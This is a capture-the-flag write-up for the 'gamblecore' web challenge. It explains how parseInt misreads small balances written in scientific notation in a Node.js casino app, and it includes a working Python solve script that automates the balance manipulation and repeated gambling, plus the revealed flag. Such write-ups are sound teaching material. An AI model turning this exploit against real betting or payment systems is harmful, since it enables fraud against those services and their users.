---
title: gamblecore
date: 2025-11-28
tags:
  - web
  - LakeCTF-Quals-2025
---

**Challenge:** gamblecore  
**Category:** Web  
**Flag:** `EPFL{we_truly_live_in_a_society}`

---

## My initial read / first impressions

We are presented with a "Neon Casino" web application. The premise is simple: you have a wallet with "Microcoins" and "USD." You can gamble your funds with a 9% chance to multiply your bet by 10, or you can convert your coins to USD.

The goal is explicit: we need **$10 USD** to buy the flag from the "Black Market" section.

We are provided with the source code (Node.js/Express). Looking at the `server.js` file, I noticed a few constraints immediately:

1.  **Starting Funds:** We start with `10e-6` coins (which is 0.00001 coins) and $0 USD.
2.  **Conversion Rate:** 1 Coin = $0.01 USD.
3.  **The Goal:** We need $10 USD. To get this legitimately via conversion, we would need 1,000 Coins. Since we start with 0.00001 coins, earning this through the 9% win-rate gambling game seems statistically impossible.

There had to be a logic bug in how the server handles money.

## The Vulnerability

I scanned the endpoints for how the server processes numbers. The `/api/convert` endpoint stood out immediately due to a very specific JavaScript behavior.

Here is the relevant code:

```javascript
app.post("/api/convert", (req, res) => {
  let { amount } = req.body;
  const wallet = req.session.wallet;

  // THE BUG IS HERE
  const coinBalance = parseInt(wallet.coins);

  amount = parseInt(amount);

  if (amount <= coinBalance && amount > 0) {
    wallet.coins -= amount;
    wallet.usd += amount * 0.01;
    // ... success ...
  }
});
```

The vulnerability lies in `parseInt(wallet.coins)`.

In JavaScript, `wallet.coins` is stored as a floating-point number. If a number becomes very small (specifically smaller than `1e-6`), JavaScript automatically converts it to **scientific notation** when casting it to a string.

For example, if you have `0.0000009` coins, JavaScript sees this as `"9e-7"`.

When you run `parseInt("9e-7")`, the function looks at the string from left to right. It sees the `9`, takes it, then sees the `e`. Since `e` is not a digit, `parseInt` stops there and returns `9`.

**The Exploit:**
The server thinks we have **9 whole coins** because of this parsing error, even though we actually have **0.0000009 coins**. We can request to convert these "ghost" coins into real USD.

## The Logic

To exploit this, we need to carefully manipulate our balance to force it into scientific notation (below `0.000001`), and then convert the ghost coins. However, this only gets us a few cents. We still need $10 for the flag.

### Step 1: Trigger the "parseInt" Bug

We start with `0.00001` coins. We need to lower our balance to something like `0.0000009` (9e-7).
We can do this by betting exactly `0.0000091` coins.

- If we lose (which is 91% likely), our balance becomes: `0.00001 - 0.0000091 = 0.0000009`.
- Now our balance is `9e-7`.
- We tell the server to convert `9` coins.
- `parseInt(9e-7)` returns `9`. The check passes.
- We gain `9 * 0.01 = $0.09` USD.

### Step 2: Brute Force the Casino

Now we have $0.09 USD. We need $10.00 USD.
Since the game is pure RNG (Random Number Generation) with no seed manipulation possible, we simply have to get lucky. Since the win rate is 9% (roughly 1 in 11), we can script a "Let it Ride" strategy.

1.  **Bet the full $0.09.** If we win, we have $0.90.
2.  **Bet the full $0.90.** If we win, we have $9.00.
3.  **Bet $1.00 repeatedly.** We have 9 dollars, so we have 9 attempts to hit a 1-in-11 shot to get over the 10 dollar mark.

If we fail at any point, we just restart the script and create a new session. The probability of this chain succeeding is roughly 1 in 240, which a script can crack in less than a minute.

## Solution Script

I wrote a Python script to automate this. It handles the session creation, the precise betting to trigger the bug, and the "all-in" gambling strategy.

```python
import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://chall.polygl0ts.ch:8148"

def solve():
    attempts = 0
    while True:
        attempts += 1
        s = requests.Session()

        try:
            bet_setup = 0.0000091
            r = s.post(f"{URL}/api/gamble", json={'currency': 'coins', 'amount': bet_setup}, verify=False)
            if r.json().get('win') is True:
                continue

            r = s.post(f"{URL}/api/convert", json={'amount': 9}, verify=False)
            if 'success' not in r.text:
                r = s.post(f"{URL}/api/convert", json={'amount': 8}, verify=False)
                if 'success' not in r.text:
                    continue

            bal_res = s.get(f"{URL}/api/balance", verify=False).json()
            usd = bal_res['usd']

            r = s.post(f"{URL}/api/gamble", json={'currency': 'usd', 'amount': usd}, verify=False)
            if not r.json().get('win'):
                continue
            usd = r.json()['new_balance']

            r = s.post(f"{URL}/api/gamble", json={'currency': 'usd', 'amount': usd}, verify=False)
            if not r.json().get('win'):
                continue
            usd = r.json()['new_balance']

            while 1 <= usd < 10:
                r = s.post(f"{URL}/api/gamble", json={'currency': 'usd', 'amount': 1}, verify=False)
                data = r.json()
                usd = data['new_balance']
                if data.get('win'):
                    break

            if usd >= 10:
                r = s.post(f"{URL}/api/flag", verify=False)
                break

        except Exception:
            continue

if __name__ == "__main__":
    solve()
```
